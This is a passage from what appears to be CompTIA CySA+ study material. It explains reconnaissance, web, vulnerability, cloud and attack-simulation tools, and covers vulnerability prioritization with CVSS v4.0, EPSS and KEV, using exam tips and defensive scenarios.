The tools also split along a noise-and-legality axis the exam expects you to recognize. Active reconnaissance — an Nmap or Masscan port scan, a Metasploit probe — sends packets directly to the target, which means it can be logged, detected by an IPS, and, against systems you do not own, may be unlawful. Passive reconnaissance — Maltego and Recon-ng pulling from DNS records, certificate transparency logs, WHOIS, breach databases, and public code repositories — never touches the target and is therefore invisible to it. An attacker's kill chain usually begins passively: harvest employee names, subdomains, and exposed infrastructure from open sources before sending a single packet, then transition to active scanning only once a target list is built. A defender benefits from the same lens. Running OSINT tools against your own organization reveals what an attacker can already learn for free — forgotten subdomains, leaked credentials in a public repo, an exposed admin portal — and feeds attack-surface management. Mistaking a passive OSINT tool for an active scanner, or vice versa, is exactly the category error the tool questions are built to catch.

Discovery vs Exploitation vs OSINT
Three different jobs: Angry IP / Masscan / Nmap answer "what is reachable and listening?"; Metasploit answers "can this vulnerability actually be exploited?"; Maltego / Recon-ng answer "what can I learn about the target from open sources without touching it?" Picking the wrong category is the most common tool-question error.
Exam Tip
Need OS detection, version detection, and scripting against specific hosts = Nmap (GUI = Zenmap). Need to port-scan the entire internet quickly = Masscan. Need to confirm a vuln is exploitable / get a shell = Metasploit. Need graphed OSINT relationships = Maltego. Need modular OSINT collection = Recon-ng. A filtered port in Nmap output usually means a firewall is silently dropping the probe.
Scenario
An analyst must inventory open services across a /16 (65k addresses) before a maintenance window closes. A full Nmap version scan would never finish in time, so the analyst runs Masscan to rapidly map open ports, then targets only the responsive hosts with Nmap -sV for service/version detail. To later prove that an exposed service is genuinely exploitable rather than a false positive, the analyst would pivot to Metasploit, and to enumerate the organization's external footprint and subdomains beforehand, Recon-ng or Maltego.

title: Web Application Scanners
html:
Web applications expose attack surface that generic network scanners miss — injection flaws, broken authentication, cross-site scripting, insecure deserialization, and business-logic abuse. CySA+ names three web-focused tools, and you must distinguish the interactive proxy/testing suites from the fast signature scanner. The distinction matters because a network or host vulnerability scanner sees a web server as an open port running a known daemon version; it cannot reason about the application's parameters, session handling, or the way it constructs a SQL query from user input. That reasoning requires tools built to speak HTTP fluently and to manipulate requests.

The Three Named Tools

ToolTypeBest at
Burp SuiteIntercepting proxy + testing suite (commercial)Manual and automated web app testing: intercept, repeater, intruder, scanner
OWASP ZAPIntercepting proxy + scanner (free/open source)Same proxy workflow as Burp; spider, active/passive scan; great for CI pipelines
NiktoFast web server signature scannerQuickly flags known server misconfigs, dangerous files, outdated software

Burp Suite and OWASP ZAP work the same way conceptually: they sit between the browser and the application as an intercepting proxy, letting the analyst observe, modify, and replay requests. Both spider the app to map its content and can launch active scans for injection and XSS. Burp is the commercial standard with a richer manual-testing toolkit (Intruder, Repeater); ZAP is the free, automation-friendly equivalent commonly wired into build pipelines.

TraitBurp SuiteOWASP ZAP
LicenseCommercial (free community edition)Free / open source
Manual-testing depthRicher (Intruder, Repeater)Capable but lighter
CI/CD automationSupported (Enterprise)First-class; common in pipelines
Best fitHands-on pentest and deep manual workAutomated baseline scans on every build

Nikto is different in kind: it is a fast, noisy command-line scanner that checks a web server against a large signature database of known dangerous files, default content, and outdated/misconfigured components. It is quick reconnaissance, not a deep interactive testing platform, and it makes no effort to be stealthy.

Inside the Proxy Workflow

The power of an intercepting proxy comes from the components the analyst drives by hand:

  • Proxy: pauses a live request so the analyst can read and alter any header, cookie, or parameter before it reaches the server.
  • Repeater: resends a single request over and over with small modifications — the core loop for confirming an injection point by watching how the response changes.
  • Intruder (Burp) / fuzzer (ZAP): automates that loop across a payload list, hammering one parameter with hundreds of variations to find the input that breaks the application's logic.
  • Spider / crawler: maps reachable content and forms so the active scanner knows what to test.

None of this is possible with a signature scanner, which simply requests known paths and matches responses against its database.

Active Versus Passive Web Scanning

ModeWhat it doesRisk and use
Passive (proxy)Observes traffic the analyst generates by browsingSafe; flags issues seen in normal responses
Active (attack) scanSends crafted malicious payloads to inputsCan alter data or trigger errors; use on test/staging
Signature scan (Nikto)Requests known dangerous paths/filesFast, noisy server-level recon

A crucial operational point: an active web scan can submit forms, create records, send emails, or even delete data because it is exercising real application functionality with attack payloads. For that reason analysts run active scans against staging or with careful scoping, never blindly against production with live customer data, and they coordinate with application owners so the scan's side effects are expected.

Mapping Findings to the OWASP Top 10

Web-application scanners are most useful when their output is organized against a shared vocabulary of web risk, and the OWASP Top 10 is that vocabulary. It catalogs the most prevalent classes of web-application weakness — injection, broken access control, cryptographic failures, security misconfiguration, vulnerable and outdated components, identification and authentication failures, and server-side request forgery among them. Burp and ZAP report their findings against these categories, which lets the analyst communicate risk to developers in terms they recognize and prioritize systemic weaknesses rather than one-off bugs. The Top 10 is awareness guidance, not an exhaustive checklist; an application can pass an automated scan and still harbor business-logic flaws that no scanner understands — an authorization check that lets one user read another's records by changing an ID, for instance. That is why interactive manual testing with Burp's Repeater remains essential alongside automated scanning: the tool finds the known patterns, and the analyst reasons about the logic the tool cannot.

Proxy Suite vs Signature Scanner
Burp and ZAP are interactive proxies for hands-on testing and crafting attacks against application logic; Nikto is a signature scanner that rapidly enumerates known server-level issues. If a question stresses intercepting/modifying requests or manual exploration, the answer is Burp or ZAP. If it stresses a quick scan for outdated server software and dangerous default files, it is Nikto.
Exam Tip
Free, open-source web proxy/scanner suited to CI/CD = OWASP ZAP. Commercial proxy with Intruder/Repeater for deep manual testing = Burp Suite. Fast signature scan of a web server for known issues = Nikto. All three are web-app/web-server tools — do not confuse them with network scanners like Nmap or host vulnerability scanners like Nessus. An active web scan can modify data, so target staging, not production.
Scenario
A developer reports a login form may be vulnerable to injection. The analyst loads the site through Burp Suite, intercepts the authentication request, and uses Repeater to manually tamper with parameters and confirm the flaw — work Nikto cannot do because it does not manipulate application requests. For the team's nightly pipeline, the analyst instead wires in OWASP ZAP to run an automated baseline scan on every build, and reserves the noisy Nikto sweep for a quick check of server-level misconfigurations on newly deployed hosts.

title: Vulnerability Scanners
html:
Dedicated vulnerability scanners are the workhorses of a VM program: they enumerate hosts, fingerprint software, and match findings against vast databases of known CVEs and misconfigurations. The exam names three, and you should know their licensing model and sweet spot. Underneath the branding, every one of these tools works the same way: it identifies what a host is running, consults a regularly updated feed of checks (plugins, NVTs, or templates), and reports each match with a severity rating and remediation guidance. The quality of the result hinges far more on configuration and feed freshness than on the brand name.

The Three Named Scanners

ScannerModelDistinguishing trait
NessusCommercial (Tenable)Industry-standard general-purpose scanner; huge plugin library, credentialed scanning, compliance audits
OpenVASOpen source (Greenbone)Free, full-featured network vulnerability scanner; a common Nessus alternative
NucleiOpen source, template-drivenFast, YAML-template scanner; great for targeted, customizable checks and CI/CD automation

Nessus is the de facto commercial standard — broad plugin coverage, strong credentialed scanning for low false positives, and built-in compliance/baseline audit policies. OpenVAS (now part of Greenbone) is the leading open-source equivalent, performing comparable network vulnerability assessment without licensing cost. Nuclei takes a different shape: it runs community-maintained YAML templates that each describe one check, making it extremely fast, scriptable, and easy to extend — favored for targeted scanning and pipeline integration rather than as a single all-in-one console.

How the Plugin/Feed Engine Works

A scanner is only as current as its check feed. Nessus ships plugins authored and updated by the vendor, OpenVAS pulls Network Vulnerability Tests from the Greenbone feed, and Nuclei consumes a community template repository. When a new CVE is published, the value of the scanner depends on how quickly a matching check appears in its feed and on the analyst keeping that feed up to date — a scanner running last month's plugins will simply not see this month's vulnerabilities. Each engine sources its checks differently:

  • Nessus: vendor-authored plugins updated by Tenable.
  • OpenVAS: Network Vulnerability Tests (NVTs) from the Greenbone feed.
  • Nuclei: community-maintained YAML templates from a public repository.

This is why feed updates are scheduled as a standing task, not an afterthought. The check itself encodes how to detect the flaw: a version comparison, a registry key read under credentials, a configuration value, or in some cases a safe probe that confirms the condition without exploiting it.

Tuning to Trust the Output

A scanner's output is only as good as its configuration. Credentialed policies, accurate asset targeting, and an up-to-date plugin/template feed determine whether findings are trustworthy. Scanners report severity (commonly via CVSS), but they do not by themselves decide what to fix first — that is the analyst's prioritization job, covered in later sections. Analysts also tune the scanner over time: suppressing confirmed false positives, scoping noisy plugins away from incompatible assets, and selecting policies (basic, credentialed, compliance, web) that match each target class. A well-tuned scanner produces a report the remediation teams trust; an untuned one produces noise they learn to ignore.

Why Scanners Disagree, and How to Reconcile Them

It is common for two scanners pointed at the same host to return different findings, and the analyst must understand why rather than assuming one is broken. Differences arise from feed coverage (one tool has a plugin for a CVE the other has not authored yet), detection method (a version-banner check versus a credentialed registry read can reach opposite conclusions when a backported fix leaves the banner unchanged), credential state (a credentialed run sees patch level directly while a non-credentialed run guesses), and timing (a host patched between the two scans). This is also why running more than one scanner reduces false negatives: the union of two tools' findings catches exposures that either alone would miss. The reconciliation discipline is to treat a discrepancy as a hypothesis to validate — confirm the actual patch state on the host — not to reflexively trust the noisier or quieter tool. Backported security fixes in long-term-support Linux distributions are a classic trap: the package version string looks old and triggers a version-based false positive, while a credentialed check that reads the distribution's changelog correctly reports the host as patched.

Discrepancy sourceWhy scanners disagreeReconciliation
Feed coverageOne tool has a plugin the other has not authoredTake the union; confirm on host
Detection methodVersion banner vs credentialed registry readTrust the credentialed result
Credential stateCredentialed run sees patch level; non-credentialed guessesRe-run with credentials
Scan timingHost patched between the two scansRe-scan both at the same point
NeedReach for
Enterprise compliance audits + low false positivesNessus (credentialed policies)
Comprehensive scanning at no license costOpenVAS
Fast, scriptable, targeted checks in CI/CDNuclei
General-Purpose vs Template-Driven
Nessus and OpenVAS are general-purpose, console-driven scanners that try to assess everything on a host. Nuclei is template-driven and lightweight: you point it at specific, well-defined checks and it runs them at speed. Reach for Nuclei when you need a fast, automatable, customizable scan; reach for Nessus/OpenVAS for comprehensive enterprise assessment.
Exam Tip
Commercial, plugin-rich, compliance-capable enterprise scanner = Nessus. Free, open-source full network scanner = OpenVAS. Fast, YAML-template, CI/CD-friendly scanner = Nuclei. Remember these are vulnerability scanners (CVE/misconfig detection), distinct from web-app proxies (Burp/ZAP) and discovery tools (Nmap/Masscan). A scanner missing recent CVEs almost always has a stale plugin/template feed.
Scenario
A budget-constrained team needs comprehensive, credentialed internal vulnerability scanning but cannot purchase a license. The analyst deploys OpenVAS to cover the enterprise at no licensing cost, schedules a nightly feed update, and configures credentialed policies to keep false positives low. Separately, the application team wants a fast, repeatable check for a handful of specific exposures on every deploy; the analyst adds Nuclei templates to the CI pipeline rather than running a heavyweight full scan on each build.

title: Cloud Infrastructure Assessment and Breach-Attack-Simulation Tools
html:
Cloud and container environments need purpose-built assessment because traditional network scanners do not understand IAM policies, storage-bucket permissions, or image layers. CySA+ also introduces breach-and-attack-simulation (BAS) tools that emulate adversary techniques to test detection and response. Group these tools by job: cloud-posture/config assessment, container/IaC scanning, and adversary emulation. The reason network scanners fall short in the cloud is that the most dangerous cloud risks are rarely open ports — they are a misconfigured IAM role granting wildcard permissions, a storage bucket made public, an unencrypted volume, or a disabled logging trail, none of which a port scan can see. These risks live in the provider's control plane, reachable only through its management APIs.

Cloud Posture and Container/IaC Scanning

ToolFocusWhat it checks
ScoutSuiteMulti-cloud posture auditMisconfigurations across AWS, Azure, GCP from API data
ProwlerCloud security/compliance (AWS-centric, multi-cloud)Hundreds of checks mapped to CIS, PCI, etc.
TrivyContainer/artifact scannerVulnerabilities in images, filesystems, and dependencies; also IaC and secrets
CheckovInfrastructure-as-Code (IaC) scannerStatic analysis of Terraform/CloudFormation/Kubernetes for insecure config

ScoutSuite and Prowler assess cloud account posture — they query provider APIs to flag public buckets, overly permissive IAM, unencrypted volumes, and missing logging. Trivy scans container images and artifacts for known CVEs (shifting security left into the build), and Checkov performs static IaC analysis, catching insecure infrastructure definitions before they are ever deployed.

Shifting Left Across the Pipeline

These tools map cleanly onto the stages of a cloud delivery pipeline, and the recurring theme is catching a problem at the earliest, cheapest stage. Checkov runs against the Terraform or CloudFormation source before anything is provisioned — the leftmost, cheapest point, where a bad setting is a one-line code fix. Trivy runs in the build stage against the container image, blocking a vulnerable dependency before it ships. ScoutSuite and Prowler run against the live account, catching drift that appears after deployment — a bucket someone made public last week, a role that accumulated excess permissions. The same misconfiguration can therefore be caught at three different points; a mature program layers all three so a slip at one stage is caught at the next.

Breach-and-Attack-Simulation

  • Atomic Red Team: a library of small, discrete tests mapped to MITRE ATT&CK techniques. Analysts run individual "atomics" to verify whether a given technique is detected by existing controls.
  • Caldera: a MITRE automated adversary-emulation platform that chains techniques into full, autonomous attack scenarios to test detection and response end-to-end.
BAS toolGranularityAnswers
Atomic Red TeamSingle ATT&CK technique ("atomic")Is this one technique detected?
CalderaChained, autonomous multi-stage operationDoes detection hold across a full kill chain?

BAS tools answer a question scanning cannot: not "do I have a vulnerability?" but "would my detection and response actually catch an attacker exploiting one?" Running an Atomic Red Team test for a specific ATT&CK technique — say, credential dumping — and then checking whether the SIEM alerted closes the loop between having controls and proving they work. Caldera extends this from single techniques to a chained, multi-stage operation that exercises an entire kill chain, surfacing detection gaps that only appear when techniques are combined.

The Shared Responsibility Model

Underlying every cloud assessment decision is the shared responsibility model, which the exam expects you to apply when scoping. The provider secures the infrastructure — the physical data center, the hypervisor, the managed-service control plane — while the customer remains responsible for what they put on top: data, identity and access configuration, network rules, operating systems in IaaS, and application code. Where the line falls shifts by service model. In IaaS the customer patches the guest OS and is the right target for traditional vulnerability scanning; in PaaS and SaaS the provider handles more of the stack, so customer assessment narrows to configuration and access (exactly what ScoutSuite and Prowler examine). Misjudging the boundary produces two failure modes: scanning something the provider already owns and cannot be changed, or assuming the provider secures a misconfiguration that is in fact the customer's to fix — the public bucket being the canonical example. Posture tools are valuable precisely because they audit the customer's side of that line.

Pipeline stageToolCatches
Pre-deploy (IaC source)CheckovInsecure Terraform/CloudFormation
Build (artifact/image)TrivyVulnerable dependencies, secrets
Runtime (live account)ScoutSuite / ProwlerPosture drift, public buckets, weak IAM
ValidationAtomic Red Team / CalderaDetection and response gaps
Posture vs Image vs IaC vs Emulation
Four distinct jobs: ScoutSuite/Prowler audit the running cloud account's configuration; Trivy scans the built container/artifact for vulnerabilities; Checkov scans the IaC templates before deployment; Atomic Red Team/Caldera emulate attacker techniques to validate that detection and response actually work.
Exam Tip
Find a public S3 bucket or over-permissive IAM = ScoutSuite/Prowler. Find CVEs in a Docker image = Trivy. Catch an insecure Terraform setting before deploy = Checkov. Test whether your SOC detects ATT&CK technique X = Atomic Red Team (single technique) or Caldera (full automated chain).
Scenario
A team is migrating to AWS and wants to catch problems at every stage. The analyst adds Checkov to the pipeline so insecure Terraform never deploys, runs Trivy on each container image to block vulnerable dependencies, and schedules Prowler against the live account to flag drift like a newly public bucket. Finally, to confirm the SOC would catch a real intrusion, the team runs Caldera to emulate a multi-step ATT&CK scenario and measures detection coverage against each technique.

title: Vulnerability Prioritization Criteria
html:
A scanner can return thousands of findings; an organization can never fix them all at once. The analyst's central skill is prioritization — deciding which vulnerabilities to remediate first based on real risk, not raw count or severity label. CySA+ enumerates the criteria that drive that decision, and the recurring theme is that severity is not the same as risk. A vulnerability becomes a real risk only when a capable threat actor can reach a valuable asset through it before the organization can close the gap; prioritization is the discipline of estimating that real-world likelihood and impact rather than trusting a single number.

The Prioritization Criteria

  • Exploitability: how hard is it to exploit? A flaw needing local access and a rare configuration ranks far below one exploitable remotely with no authentication.
  • Active exploitation / threat intelligence: is it being exploited right now in the wild? A CVE on CISA's Known Exploited Vulnerabilities (KEV) list jumps the queue regardless of its base score.
  • Asset value: a critical flaw on a crown-jewel database outweighs the same flaw on a disposable test box.
  • Impact: what happens if it is exploited — data breach, downtime, safety risk? Confidentiality/integrity/availability consequences shape urgency.
  • Patch / remediation availability: a fixable vulnerability can be scheduled; one with no patch yet needs compensating controls and may warrant accepting interim risk.

Accuracy: True/False Positives and Negatives

Before acting, the analyst must trust the finding. Scanners make two kinds of errors, and confusing a false positive with a false negative wastes effort or hides real risk.

ResultMeaningAnalyst concern
True positiveReal vulnerability, correctly reportedRemediate
False positiveReported but not actually presentWastes effort; validate and suppress
True negativeNot vulnerable, correctly silentIdeal
False negativeVulnerable but NOT reportedMost dangerous — hidden risk
The false negative is the analyst's nightmare: a real exposure the scanner never flagged. Credentialed scanning, multiple tools, and threat-informed manual review reduce false negatives.

Validating a Finding Before You Act

Because acting on a false positive wastes scarce remediation effort and acting on a false negative is impossible until you discover it, validation sits at the front of the prioritization workflow. The analyst corroborates a high-priority finding through multiple independent signals before escalating it: re-running the check with credentials, comparing a second scanner's result, confirming the affected version directly on the host, and where appropriate using an exploitation framework to prove the flaw is reachable and weaponizable rather than merely reported. Validation also informs ranking — a finding confirmed exploitable in your specific configuration outranks one that is theoretically present but blocked by an existing control. The cost of validation must be proportional: a single critical, internet-facing finding warrants hands-on confirmation, while thousands of low-severity informational findings are better handled by tuning and suppression than by individually chasing each one. Mature programs feed confirmed false positives back into the scanner as suppression rules so the same noise does not resurface every cycle.

Weighting the Criteria Into a Single Decision

No single criterion decides priority; the analyst combines them. A practical model treats exploitability and active-exploitation evidence as the likelihood side, and asset value and impact as the consequence side — the product of the two approximates risk. A flaw that is remotely exploitable without authentication (high likelihood) on the public payment server (high consequence) and present on the KEV list (confirmed exploitation) is unambiguously top of the queue. The same CVE on a decommissioned lab box with no exploit in circulation is near the bottom. Patch availability then shapes the response: where a patch exists, the work is scheduling and testing; where none exists, the analyst pivots to compensating controls and may formally accept interim risk.

Validation methodConfirmsEffort
Credentialed re-scanPatch/config state read from inside the hostLow
Second-scanner comparisonFinding is not a single-tool artifactLow
Direct version check on hostThe affected component is actually presentModerate
Exploitation framework probeFlaw is reachable and weaponizableHigh — reserve for critical findings
CriterionPushes priority up when…
ExploitabilityRemote, no auth, no user interaction needed
Active exploitationOn KEV / seen in the wild now
Asset valueCrown-jewel data or critical service
ImpactBreach, outage, or safety consequence
ExposureInternet-facing rather than isolated
Severity vs Risk
A CVSS "critical" on an isolated, internal, hard-to-reach asset may pose less real risk than a "medium" on an internet-facing server with a public exploit and active in-the-wild attacks. Prioritization fuses severity with exploitability, exposure, asset value, and threat intelligence — the number alone never decides.
Exam Tip
If a scenario mentions a vulnerability is on the CISA KEV list or "actively exploited," prioritize it even over a higher CVSS score — active exploitation trumps raw severity. The false negative is always the most dangerous error. "Reported but the patch is already installed" describes a false positive — validate, then suppress.
Scenario
The queue holds a CVSS 9.8 on a segmented lab VM with no known exploit, and a CVSS 7.5 on the public e-commerce server that appears on the KEV list with proof-of-concept code circulating. Despite the lower score, the analyst remediates the 7.5 first: it is internet-facing, actively exploited, and on a high-value asset. Prioritizing by base score alone would have left the genuinely urgent risk exposed while the team spent effort on a flaw no attacker could reach.

title: CVSS Scoring
html:
The Common Vulnerability Scoring System (CVSS) is the industry standard for expressing a vulnerability's severity as a number from 0.0 to 10.0, accompanied by a human-readable vector string. CySA+ expects you to understand the metric groups and how they roll up into a score — and to recognize that the base score is a starting point, not a final risk verdict. CVSS gives the security community a common language: instead of one vendor calling a flaw "high" and another "moderate," everyone can reference the same vector and arrive at the same number, which is what makes large-scale triage and feed-driven automation possible.

The Metric Groups

GroupCapturesSet by
BaseIntrinsic, constant characteristics of the flawVendor / NVD
ThreatCurrent exploit maturity / state in the wildAdjusts over time
EnvironmentalHow it applies to your specific environmentThe consuming organization
SupplementalExtra context (safety, recovery, automatable, etc.)Informational, no score change

The four groups break down as follows:

  • Base metrics: the only group always published — exploitability metrics (Attack Vector, Attack Complexity, Privileges Required, User Interaction) plus Attack Requirements in CVSS v4.0, combined with separate confidentiality, integrity, and availability impacts for the vulnerable system and subsequent systems. CVSS v3.1 instead uses a Scope metric and Base, Temporal, and Environmental groups.
  • Threat metrics: adjust the score for whether functional exploit code exists.
  • Environmental metrics: let an organization re-weight based on its own asset criticality and existing controls.
  • Supplemental metrics: new in CVSS v4.0, add non-scoring context such as Safety and Automatable.

Reading the Vector and Score

The vector string encodes each chosen metric, e.g. CVSS:4.0/AV:N/AC:L/PR:N/UI:N/..., meaning network attack vector, low complexity, no privileges, and no user interaction. This abbreviated vector omits required CVSS v4.0 metrics, including Attack Requirements and impact metrics; it cannot establish a complete score. A scoring engine maps the vector to the 0–10 number and a qualitative band (None/Low/Medium/High/Critical).

Score bandQualitative rating
0.0None
0.1–3.9Low
4.0–6.9Medium
7.0–8.9High
9.0–10.0Critical

Decoding the Base Metrics

The exam rewards being able to read a vector at a glance, so internalize what each base metric value signals. Attack Vector describes how close the attacker must be: N (network) is remotely exploitable over the internet and the worst case, descending through A (adjacent network), L (local access), to P (physical), which is hardest to reach. Attack Complexity low (AC:L) means no special conditions are required, raising severity. Privileges Required none (PR:N) means the attacker needs no account at all. User Interaction none (UI:N) means no victim has to click anything. The CIA impact metrics rate each as none, low, or high. A vector reading AV:N/AC:L/PR:N/UI:N with high impacts across the board is the textbook "wormable" worst case — remotely reachable, trivial, unauthenticated, and requiring no human in the loop.

MetricWorst valueMeaning
Attack Vector (AV)N (network)Exploitable remotely over the internet
Attack Complexity (AC)L (low)No special conditions needed
Privileges Required (PR)N (none)No account required
User Interaction (UI)N (none)No victim action needed

What Changed in CVSS v4.0

Distinguish the vector version explicitly: CVSS v4.0 changes several concepts from v3.1. The headline change is the breakup of the single Base impact view into separate Vulnerable System and Subsequent System impact metrics, replacing the old binary Scope flag with a richer expression of how damage propagates beyond the initially affected component. The exploitability side adds an Attack Requirements metric alongside Attack Complexity, distinguishing a flaw that needs specific preconditions from one with genuinely low complexity. The naming convention itself signals which metrics are in play — a score may be labeled CVSS-B (base only), CVSS-BT (base plus threat), CVSS-BE (base plus environmental), or CVSS-BTE (all three) — making it explicit how much context a given number reflects. The wholly new Supplemental group conveys context such as Safety, Automatable, Recovery, and Value Density without altering the numeric score. The practical takeaway is unchanged: a bare base score is an incomplete picture, and v4.0 simply gives the analyst more structured ways to layer in threat and environmental reality.

Base Is Not Your Risk
Most published feeds show only the base score, which assumes nothing about your environment or current threat activity. Applying the environmental metrics (does this asset hold sensitive data? do compensating controls exist?) and threat metrics (is exploit code public?) tailors the score to reality — which is exactly why prioritization layers EPSS and threat intel on top of CVSS.
Exam Tip
For CVSS v4.0, memorize the four groups: Base (intrinsic, set by vendor), Threat (exploit maturity), Environmental (your context, set by you), Supplemental (extra context, no score impact). AV:N = network-exploitable (worst case for attack vector). The 9.0–10.0 band = Critical. Remember the published number is usually the base score only.
Scenario
A vendor advisory lists a base score of 8.1 for a flaw in a logging library. The analyst notes the vector shows AV:N/PR:N/UI:N — remotely exploitable with no authentication or user interaction — and that the affected server is in a high-sensitivity zone. Applying the environmental metrics raises the effective severity for the organization, and confirming public exploit code adjusts the threat metric upward, justifying emergency patching even though the published base number alone might have been triaged as merely "high."

title: EPSS and Context Awareness
html:
CVSS tells you how bad a vulnerability is in theory; it does not tell you how likely it is to actually be exploited. The Exploit Prediction Scoring System (EPSS) fills that gap, and adding environmental context sharpens prioritization further. Together they answer the question CVSS alone cannot: of all my high-severity findings, which will an attacker truly come after? This matters because the overwhelming majority of published CVEs are never exploited in the wild, so a program that patches strictly by CVSS spends enormous effort on flaws no attacker will ever weaponize while potentially deferring the smaller set that attackers actually use.

What EPSS Adds

EPSS produces a probability (0 to 1, or 0–100%) that a given CVE will be exploited in the wild within the next 30 days. It is a data-driven, machine-learning model trained on real exploitation telemetry, refreshed daily. A CVE can carry a CVSS of 9.8 yet an EPSS of 1% (theoretically dangerous, rarely attacked) or a modest CVSS with a high EPSS (less severe but actively targeted). Used alongside CVSS, EPSS lets analysts focus remediation on the vulnerabilities most likely to be hit.

SystemAnswersBest used for
CVSSHow severe / impactful is it?Baseline severity
EPSSHow likely is it to be exploited soon?Likelihood-based triage
CISA KEVIs it confirmed exploited already?Mandatory fast-track

Vulnerabilities in Context

The same CVE poses different risk depending on where the affected asset lives:

  • External context: internet-facing assets are reachable by any attacker — highest urgency.
  • Internal context: reachable only after a foothold; still important for lateral-movement defense but less immediately exposed.
  • Isolated context: air-gapped or heavily segmented assets with no practical attack path — the same CVE may warrant a far lower priority.
Asset contextReachabilityEffect on priority
ExternalAny internet attackerRaises priority sharply
InternalOnly after a footholdModerate — lateral-movement concern
IsolatedNo practical attack pathLowers priority even at high CVSS
Context awareness multiplies severity by reachability. A critical flaw nobody can reach is a low practical risk; a moderate flaw on the perimeter with high EPSS is an emergency.

EPSS, CVSS, and KEV as Complementary Signals
